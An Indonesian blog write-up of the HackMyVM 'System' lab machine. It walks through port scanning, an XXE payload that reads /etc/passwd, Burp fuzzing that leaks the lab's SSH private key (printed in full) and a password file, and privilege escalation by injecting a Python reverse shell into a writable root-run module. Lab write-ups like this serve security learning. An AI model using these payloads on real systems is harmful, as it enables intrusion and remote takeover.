<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackMyVM: System | sharpicx</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="HackMyVM: System" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari hackmyvm berkategori Easy ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan local file read atau inclusion sampai fuzzing dari user directory untuk mendapatkan password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root." />
<meta property="og:description" content="Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari hackmyvm berkategori Easy ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan local file read atau inclusion sampai fuzzing dari user directory untuk mendapatkan password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root." />
<link rel="canonical" href="http://localhost:4000/hmv-system" />
<meta property="og:url" content="http://localhost:4000/hmv-system" />
<meta property="og:site_name" content="sharpicx" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-16T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackMyVM: System" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-16T00:00:00+07:00","datePublished":"2022-05-16T00:00:00+07:00","description":"Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari hackmyvm berkategori Easy ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan local file read atau inclusion sampai fuzzing dari user directory untuk mendapatkan password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root.","headline":"HackMyVM: System","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hmv-system"},"url":"http://localhost:4000/hmv-system"}</script>
<!-- End Jekyll SEO tag -->


<meta name="keywords" content="XXE,fuzzing,LFI,burp-intruder" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="apple-touch-icon" href="/favicon.ico"/>
<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

<!--[if lt IE 9]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->


<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>


<script src="/assets/script/jekyllpaper.js" async ></script>
<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>


</head>
<body>
  <div class="container-wrapper">
    <header class="container-header">
      <div class="header-info">
  <span class="header-info-name">sharpicx</span><br/>
  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
</div>
<nav class="header-nav">
  <ul class="header-main-nav">
  
    <li class="header-main-nav-item"><a href="/">home</a></li>
  
    <li class="header-main-nav-item"><a href="/category">categories</a></li>
  
    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
  
  </ul>
</nav>

    </header>
    <main class="container-main">
      <article class="container-post">
  <div class="post-title" style="padding: 0px 0px 20px 0px">
    <h1>HackMyVM: System</h1>
  </div>
  <div class="post-author">
    <span>sharpicx</span>
  </div>
  <div class="post-content">
    <p>Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari <a href="https://hackmyvm">hackmyvm</a>
berkategori <strong>Easy</strong> ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan <em>local file read</em> atau <em>inclusion</em> sampai fuzzing dari user directory untuk mendapatkan
password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root.</p>

<h2 id="enumeration">enumeration</h2>
<p>sebelum itu jadikan IP sebagai variable biar gampang aja.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/system] ‹node-›  ‹›
╰─ <span class="nv">victim</span><span class="o">=</span>192.168.56.19
</code></pre></div></div>
<p>scanning port biasa lah.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/system] ‹node-›  ‹›
╰─ <span class="nb">cat </span>scan_tcp.nmap
<span class="c"># Nmap 7.92 scan initiated Mon May 16 13:28:57 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp.nmap 192.168.56.18</span>
Nmap scan report <span class="k">for </span>192.168.56.18
Host is up, received syn-ack <span class="o">(</span>0.00042s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-05-16 13:29:05 WIB <span class="k">for </span>7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRCpLEF00zJy/GkOtP8umEO3vDUpsiovHmmmfKN5njf5d4aqXBW3wUjqVL3VotabyslG6gNZnaPODVt2z3MdHsyNBuJZrbRrN26Dmz3x6pzJPnizxq2AXGzfgL89jQi83yr72gb2FpxGXm8BqYTTXwbiF7NIi+ekTmRWBa6LUQHgirqggrUq5xdmj0lTu+lMQ2Tzy4xfL6BKgyg4IaZlO9Kz9Z02ghG6VDr2vV9aInO4gu/i2nlvM+aErvWyREoqspjvhgPd0Q950AkOkKfjD5hHxLFZo7aR3PHJev+8zrKwsv/6bUAQIl8nUYifu/a+1vpSddyl37ikQNLY7RsCboBNtPryz7czF1UUtWMlICTHegrchZT3FEr+c5g51hEj+AkwwQoan2y8SCMhKIbWQQH0qBWNXnfNpKGS5y8Vn8s6KqZlsPq49/k9Pmr0jplaqgKDrPuiddGOehu5Yh6Fg5jsk5c5zXttWY17TyJdeab1LBOBJMY2ur4ZnSh+zv7E<span class="o">=</span>
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOAIZW58yN/LbK35zNnyYvo4vNm1bnBkyDn4KzLYYyGBG2owUbmMp8WcmKWxT5ImSPDUE24mlhafaDEb8smp1Mc<span class="o">=</span>
|   256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB57U+4lDKyoTXGtTCBdDtmnL1YvIhNjQpbp/tdjDYGx
80/tcp open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: HackMyVM Panel
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon May 16 13:29:12 2022 -- 1 IP address (1 host up) scanned in 14.29 seconds</span>

</code></pre></div></div>
<p>22, seperti biasa mempunyai service SSH. dan 80 adalah service dari nginx untuk http.</p>

<h2 id="80---register-page">80 - register page</h2>

<p>langsung dihadapi dengan register page ya, sangat mengesalkan sekali.</p>

<p><img src="https://i.ibb.co/645fFTY/loginpage.png" alt="taibebek" /></p>

<p>lalu saya masukkan random user seperti <em>fuckicx</em> dan password sama seperti user. lalu saya klik tombolnya suddenly memunculkan messagebox seperti gambar dibawah ini.</p>

<p><img src="https://i.ibb.co/2KkCs2C/image.png" alt="eek" />.</p>

<h2 id="--directory-brute-force">-&gt; directory brute-force.</h2>

<p>untuk menguji kebenaran tentang registerednya user. maka saya berinisiatif untuk mencari dimana login page-nya.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/system] ‹node-›  ‹›
╰─ <span class="nb">cat </span>gobuster.scan
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1094]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 169] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.56.18/js/]
/magic.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 85]
</code></pre></div></div>
<p>oh ternyata-oh ternyata, output yang saya dapat cukup simple, karena kategori easy jadi tidak heran.</p>

<h2 id="--intercept-post-traffic--burp-methodologies">-&gt; intercept POST traffic &amp; burp methodologies</h2>

<p>ternyata ketika saya <em>intercept</em>, requestnya menggunakan <em>POST</em> dengan isi data beralih menjadi <em>XML</em> cukup menarik untuk saya pikir dijadikan <strong>XXE</strong>.</p>

<p><img src="https://i.ibb.co/hRv1yXr/image.png" alt="gambar" /></p>

<p>lalu data ini saya kirim ke repeater untuk advanced testing. dan jangan lupa dari <strong>hacktricks</strong> sebuah payload XXE untuk file-read.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [
&lt;!ENTITY data SYSTEM "file:///etc/passwd"&gt;</span> 
]&gt;<span class="nt">&lt;exampledata&gt;</span><span class="ni">&amp;data;</span><span class="nt">&lt;/exampledata&gt;</span>
</code></pre></div></div>
<p>dari screenshot dibawah ini sudah terbukti bahwa injeksi untuk <em>file-read</em> berhasil.</p>

<p><img src="https://i.ibb.co/wB6J2sc/image.png" alt="gambar2" /></p>

<p>dari <strong>/etc/passwd</strong> saya bisa melihat hanya ada <strong>david</strong> di system ini sebagai user yang tesertakan.
maka dari sini saya mencari tahu dimana letak <strong>id_rsa</strong> untuk login ke shell lewat <strong>SSH</strong> service atau semacam password yang disimpan oleh user ini.
dari kasus ini juga, saya berfikir untuk mengambil cara <em>brute-force</em> ke <em>$HOME</em> path user ini menggunakan fitur burp yaitu, <strong>Intruder</strong> untuk memvalidasi apakah path dari <strong>.ssh</strong>
ada dalam directory user ini.</p>

<p><img src="https://i.ibb.co/TtzZp7N/image.png" alt="gambar3" /></p>

<p>saya khususkan fuzzing ini terhadap file/directory dibelakangan content <em>david</em>, yaitu saya namakan <strong>something</strong>. tambahkan <em>payload</em> di opsi <em>Payloads</em>, dan btw <em>payload</em> yang saya gunakan adalah:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/opt/SecLists/Discovery/Web-Content/quickhits.txt
</code></pre></div></div>
<p>lalu saya klik tombol start untuk memulai eksekusi. dan jika sudah selesai klik tabel <em>Length</em> untuk meratakan sesuatu yang sama ke arah atas, dan meminoritaskan yang beda dibawah.</p>

<p><img src="https://i.ibb.co/NsStS4M/image.png" alt="gambar4" /></p>

<p>terdapat beberapa file semacam <strong>id_rsa</strong>, <strong>id_rsa.pub</strong>, <strong>.profile</strong>, dll. di hasil <em>brute-force</em> tersebut. maka saya check apakah bisa log menggunakan <strong>SSH</strong>?.</p>

<p><img src="https://i.ibb.co/rHf6X7M/image.png" alt="id_rsa" /></p>

<p>versi lengkapnya ada dibawah sini.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="p">-----</span><span class="n">BEGIN</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="p">-----</span>
<span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
<span class="n">NhAAAAAwEAAQAAAYEA4pSlivZkgfHuXx9bWE</span><span class="p">+</span><span class="n">VxlG2hxpDcBHbTnKAyhnCILm4</span><span class="p">/</span><span class="n">pBcmOKj</span>
<span class="n">pWMRke3wmgFU0xRtYDJb9uFTLGVY1BEIzBvCGEKbziTarcdWT99Js6ggcEFtqm0e4uGlD4</span>
<span class="m">6</span><span class="n">tPTbNpmk9D3hYkjzF55maE</span><span class="p">+</span><span class="n">lU2PJdUP6l35nI45Kd6EpMf0Lrg4XvhIsjpw45ZvrNvwDU</span>
<span class="n">yJyHgddwmI7gFVg</span><span class="p">/</span><span class="n">svx5x</span><span class="p">+</span><span class="n">iiah0jiD60PI5eQCnlq879sOx7GMNxg5fquos3Cvjqi8liij</span>
<span class="n">Wdg9rEm8cowAgJeMkqTH</span><span class="p">/</span><span class="n">f7JqSRDzQ4vXNltLq8</span><span class="p">/</span><span class="n">o</span><span class="p">/</span><span class="n">nMmxoLnovfWTeIC9Rv7ZkGUv0NzA</span>
<span class="n">ILBxVfVtDF1guvyNc6lDYaDhaC7mi665hgNpGnRsjukQP8Si4JnDbK0OhHko02CbOPUddH</span>
<span class="n">XTGVIit</span><span class="p">+</span><span class="m">8d</span><span class="p">/</span><span class="m">9</span><span class="n">zmwV0dbbSUVeO4s99kN</span><span class="p">/</span><span class="n">W2HQ6btUcTUl2MCrMADcm7gwYQKWrWm</span><span class="p">+</span><span class="n">H8xBlK</span>
<span class="n">my3I5eazYhNKkKYRFpSTn5OCxrrJoJkpeXz2eMK1AAAFiOamBhjmpgYYAAAAB3NzaC1yc2</span>
<span class="n">EAAAGBAOKUpYr2ZIHx7l8fW1hPlcZRtocaQ3AR205ygMoZwiC5uP6QXJjio6VjEZHt8JoB</span>
<span class="n">VNMUbWAyW</span><span class="p">/</span><span class="n">bhUyxlWNQRCMwbwhhCm84k2q3HVk</span><span class="p">/</span><span class="n">fSbOoIHBBbaptHuLhpQ</span><span class="p">+</span><span class="n">OrT02zaZpPQ</span>
<span class="m">94</span><span class="n">WJI8xeeZmhPpVNjyXVD</span><span class="p">+</span><span class="n">pd</span><span class="p">+</span><span class="n">ZyOOSnehKTH9C64OF74SLI6cOOWb6zb8A1Mich4HXcJiO</span>
<span class="m">4</span><span class="n">BVYP7L8ecfoomodI4g</span><span class="p">+</span><span class="n">tDyOXkAp5avO</span><span class="p">/</span><span class="n">bDsexjDcYOX6rqLNwr46ovJYoo1nYPaxJvHKM</span>
<span class="n">AICXjJKkx</span><span class="p">/</span><span class="m">3</span><span class="p">+</span><span class="n">yakkQ80OL1zZbS6vP6P5zJsaC56L31k3iAvUb</span><span class="p">+</span><span class="m">2</span><span class="n">ZBlL9DcwCCwcVX1bQxd</span>
<span class="n">YLr8jXOpQ2Gg4Wgu5ouuuYYDaRp0bI7pED</span><span class="p">/</span><span class="n">EouCZw2ytDoR5KNNgmzj1HXR10xlSIrfvHf</span>
<span class="p">/</span><span class="n">c5sFdHW20lFXjuLPfZDf1th0Om7VHE1JdjAqzAA3Ju4MGEClq1pvh</span><span class="p">/</span><span class="n">MQZSpstyOXms2IT</span>
<span class="n">SpCmERaUk5</span><span class="p">+</span><span class="n">Tgsa6yaCZKXl89njCtQAAAAMBAAEAAAGBAJgosN8YRjjJqoWwvhwZHgDXoR</span>
<span class="n">crePxK0Zbl6D1QfQCTGHvDoJt</span><span class="p">/</span><span class="n">H9ySIht4yanymO9DeYwvZXjuqndW</span><span class="p">/</span><span class="n">Ac2BU1kmrzGBnGy</span>
<span class="n">aDRpeDodPhZrIpWgKrBXpXVBiSJgc1B3fDVz2PCJphlWvKSij0kt2a</span><span class="p">/</span><span class="n">zWt1olSYK1VCWhn</span>
<span class="n">qXYrXXz</span><span class="p">+</span><span class="n">c8S7Qb6G5oa</span><span class="p">/</span><span class="m">4</span><span class="n">PEZpiSYMLMyjr8A5TbIKJCAX</span><span class="p">/</span><span class="m">7</span><span class="n">RxlyqQuO01kpo9AIGVAfZ8a</span>
<span class="n">W120AZqIrbNsktKBaQ5yR3TZFsu6YA</span><span class="p">/</span><span class="n">UWC3he8Yuo94dRRDvmIlfBGyg53HuHhgZBU8eYw</span>
<span class="n">hrG1JTYiegztg8KVlQdlNcT2q6uTwEI0p5NHCVqO99tTPI</span><span class="p">/</span><span class="n">TrFVw9</span><span class="p">+</span><span class="n">B7fFwuKvhZclkDK8</span>
<span class="n">NGU</span><span class="p">/</span><span class="n">xGKIoIL3h0bDKCjAGVGdMDkK8eA9oh5tcItwzkS5CrxgS9FpX0jgJaQ4RHSYfxpfGD</span>
<span class="n">Cryyas4wAGkn0yejyCivINyoJdSVPoOZN</span><span class="p">/</span><span class="n">y1Wk3m1dWoGAvwx6ZAN4CVUolySNUudTwQAA</span>
<span class="n">AMALaZYbWOPATwo</span><span class="p">+</span><span class="n">MdjIbzdSYa18RfGEpOlcBAy9JMdziccmr7bAoQvA8uFdeMNmvCW6lC</span>
<span class="n">YU</span><span class="p">/</span><span class="m">49</span><span class="n">S8pZRjKBnSpHOtu40WzNMlMjE87Ej3EKewqMR49Jj0GUdakXMkhhhzh5lPCA5Z8LC</span>
<span class="n">Mt1YEI3xBb0</span><span class="p">/</span><span class="n">p0BJTdD3PTI5oBVGL</span><span class="p">+</span><span class="m">1</span><span class="n">HXSwBbdltI9GqlfPuhTE6AGJw8oIAL81eXIJF4L</span>
<span class="n">Nl</span><span class="p">/</span><span class="n">SOxOtevh0WSQ2zYoOGvjRmB8KgRK8vFmlGvs5XOP9rTdTYAAADBAPYZnl8X1chrL5iE</span>
<span class="n">TWeI</span><span class="p">/</span><span class="n">I0p78A5TdilOl9KwWQuzKXGn3</span><span class="p">+</span><span class="n">NTtw5y2oN</span><span class="p">/</span><span class="n">LDWfUhCYs9ABU2A3HD</span><span class="p">/</span><span class="n">scRAvBH3qp</span>
<span class="n">VHoWZP3rSOyAwaN1nM0L1UqjQY3JR36Xmilz0MufRrxdJMyufGSwgYfQtEenNTkLrAf0pO</span>
<span class="n">soEKOIdXNlBf99t</span><span class="p">/</span><span class="n">pNMSUtoEHDammOwdIkM4rc7S</span><span class="p">+</span><span class="n">OvHOMATPUFm5vtjxRZo54q9D1Raxa</span>
<span class="n">yGIvtnS2cqba2ZV</span><span class="p">+</span><span class="n">hf</span><span class="p">+</span><span class="n">f6v2UfWrklUUQAAAMEA67IDfAydw2cFEhiE1GJloH4Jk2K7gr2U</span>
<span class="n">XfjoCRcNp9x9kiaaiynqhXAGQWt7F0ouZEKvUIFSCVDKr1oFgnXD2czQcVRu2Mz2UA</span><span class="p">+</span><span class="n">RWQ</span>
<span class="n">LgMcY6zaE7uCYg9ANM5Ne9uc6FOmxNpmv3fLI7Z0ROlD</span><span class="p">/</span><span class="n">g5b2pwahcIlXAJpZqrkKJnD5A</span>
<span class="m">1</span><span class="n">A9Vth0</span><span class="p">+</span><span class="m">98l11</span><span class="n">G3</span><span class="p">/+</span><span class="n">YAEawCEJAHnIWgUq5kq1</span><span class="p">/</span><span class="n">OFKYXDhxew9KBnhr</span><span class="p">+</span><span class="n">yHOGE6TVLUnxdwQ</span>
<span class="m">46</span><span class="n">q7aIDpVmMKMlAAAADmRhdmlkQGZyZWU0YWxsAQIDBA</span><span class="p">==</span>
<span class="p">-----</span><span class="n">END</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="p">-----</span>
</code></pre></div></div>
<p>lalu ketika saya coba, this system still asks for the password.</p>

<p><img src="https://i.ibb.co/MZf2LM3/image.png" alt="askpassword" /></p>

<p>lalu saya berganti arah dan mencoba untuk melihat <em>response</em> dari result <em>brute-force</em> tadi dan menemukan kejanggalan pada file <strong>.viminfo</strong>.</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/<span class="m">1</span><span class="p">.</span><span class="m">1</span> <span class="m">200</span> OK
Server<span class="p">:</span> nginx/<span class="m">1</span><span class="p">.</span><span class="m">18</span><span class="p">.</span><span class="m">0</span>
Date<span class="p">:</span> Mon<span class="p">,</span> <span class="m">16</span> May <span class="m">2022</span> <span class="m">07</span><span class="p">:</span><span class="m">40</span><span class="p">:</span><span class="m">22</span> GMT
Content<span class="p">-</span>Type<span class="p">:</span> text/html; charset<span class="p">=</span>UTF<span class="m">-8</span>
Connection<span class="p">:</span> <span class="k">close</span>
Content<span class="p">-</span>Length<span class="p">:</span> <span class="m">786</span>

<span class="p">&lt;</span><span class="k">p</span> align<span class="p">=</span><span class="s1">'center'</span><span class="p">&gt;</span> <span class="p">&lt;</span>font color<span class="p">=</span>white size<span class="p">=</span><span class="s1">'5pt'</span><span class="p">&gt;</span> # This <span class="nb">viminfo</span> <span class="k">file</span> was generated by Vim <span class="m">8</span><span class="p">.</span><span class="m">2</span><span class="p">.</span>
# You may <span class="k">edit</span> it <span class="k">if</span> you'<span class="nb">re</span> careful<span class="p">!</span>

# Viminfo <span class="k">version</span>
<span class="p">|</span><span class="m">1</span><span class="p">,</span><span class="m">4</span>

# Value of <span class="s1">'encoding'</span> when this <span class="k">file</span> was written
*<span class="nb">encoding</span><span class="p">=</span>utf<span class="m">-8</span>


# <span class="nb">hlsearch</span> <span class="k">on</span> <span class="p">(</span>H<span class="p">)</span> <span class="nb">or</span> off <span class="p">(</span><span class="k">h</span><span class="p">):</span>
<span class="p">~</span><span class="k">h</span>
# Command Line History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>
<span class="p">:</span><span class="k">wq</span><span class="p">!</span>
<span class="p">|</span><span class="m">2</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">1648909714</span><span class="p">,,</span><span class="s2">"wq!"</span>

# Search String History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Expression History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Input Line History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Debug Line History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Registers<span class="p">:</span>

# Password <span class="k">file</span> Created<span class="p">:</span>
'<span class="m">0</span>  <span class="m">1</span>  <span class="m">3</span>  <span class="sr">/usr/</span>local<span class="sr">/etc/</span>mypass<span class="p">.</span>txt
<span class="p">|</span><span class="m">4</span><span class="p">,</span><span class="m">48</span><span class="p">,</span><span class="m">1</span><span class="p">,</span><span class="m">3</span><span class="p">,</span><span class="m">1648909714</span><span class="p">,</span><span class="s2">"/usr/local/etc/mypass.txt"</span>

# History of <span class="k">marks</span> within <span class="k">files</span> <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

<span class="p">&gt;</span> <span class="sr">/usr/</span>local<span class="sr">/etc/</span>mypass<span class="p">.</span>txt
	*	<span class="m">1648909713</span>	<span class="m">0</span>
	<span class="c">"	1	3</span>
	^	<span class="m">1</span>	<span class="m">4</span>
	<span class="p">.</span>	<span class="m">1</span>	<span class="m">3</span>
	<span class="p">+</span>	<span class="m">1</span>	<span class="m">3</span>
 <span class="k">is</span> already registered<span class="p">!</span> <span class="p">&lt;</span><span class="sr">/font&gt; &lt;/</span><span class="k">p</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>ada orang sebodoh ini menyimpan passwordnya pada komputernya sendiri, hadeh. sebenarnya tidak masalah cuma kaya aneh saja kenapa tidak di cloud atau dimana gitu kalau mau lebih aman.
entah si selera orang beda-beda, dan mungkin ini termasuk <em>human error</em> ya. dan lanjut, ketika saya read file nya and yeah saya mendapatkan passwordnya.</p>

<p><img src="https://i.ibb.co/JjkKYvZ/image.png" alt="damn" /></p>

<h2 id="shell-as-david">shell as david</h2>

<p><img src="https://i.ibb.co/Lt63Htp/image.png" alt="shell" /></p>

<h2 id="privilege-escalation">privilege escalation</h2>

<p>saya sudah menjalankan <strong>linpeas</strong> sebuah automated script untuk mengakses berbagai metode ke privesc. tapi mungkin saya kurang analitis terhadap hal ini, jadi saya pindah untuk mencoba metode lain 
ya, dengan menggunakan <strong>pspy</strong> dan saya menemukan hal menarik.</p>

<p><img src="https://i.ibb.co/3M69dpN/image.png" alt="pspy" /></p>

<p>tiba-tiba ada <em>python script</em> tereksekusi secara automasi dari UID root. lalu saya mencoba untuk membaca kode jika mempunyai permission.</p>

<p><img src="https://i.ibb.co/sFB3z8p/image.png" alt="lmfao" /></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="c1"># Reading only first line
</span><span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/david/cmd.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">read_only_first_line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
    <span class="c1"># Write a new file
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/suid.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">read_only_first_line</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">check</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s">'/tmp/suid.txt'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">check</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"File exists"</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod u+s /bin/bash"</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">NameError</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"File not exists"</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"File not exists"</span><span class="p">)</span>
</code></pre></div></div>
<p>dari <em>source code</em> sendiri dinyatakan bahwa jika kita menambahkan file <strong>cmd.txt</strong> ke <strong>$HOME</strong> path user dengan menambahkan apa saja di first line, dan juga menambahkan file text di 
path <strong>/tmp</strong> dengan nama <strong>suid.txt</strong> maka script akan menjalankan sebuah perintah <strong>chmod +s</strong> yaitu SUID atau semacam spesial permission untuk <em>executable</em> yang dimana secara harfiah
user apapun tanpa privilege apapun bisa mengeksekusi executable. tapi ketika saya coba hasilnya nihil.</p>

<p><img src="https://i.ibb.co/k5n0tBK/image.png" alt="aduh" /></p>

<p>lalu saya berfikir dari <em>source code</em> juga ada module yang dipakai, apakah writable atau tidak lalu saya mencoba untuk ngecek.</p>

<p><img src="https://i.ibb.co/TqDcFXb/image.png" alt="waw" /></p>

<p>dengan begitu saya tambahkan reverse shell python di module script <strong>os</strong> tadi.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span> 
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.0.0.1"</span><span class="p">,</span><span class="mi">4242</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">])</span>
</code></pre></div></div>

<p><img src="https://i.ibb.co/861rcRL/image.png" alt="gambarlmfao" /></p>

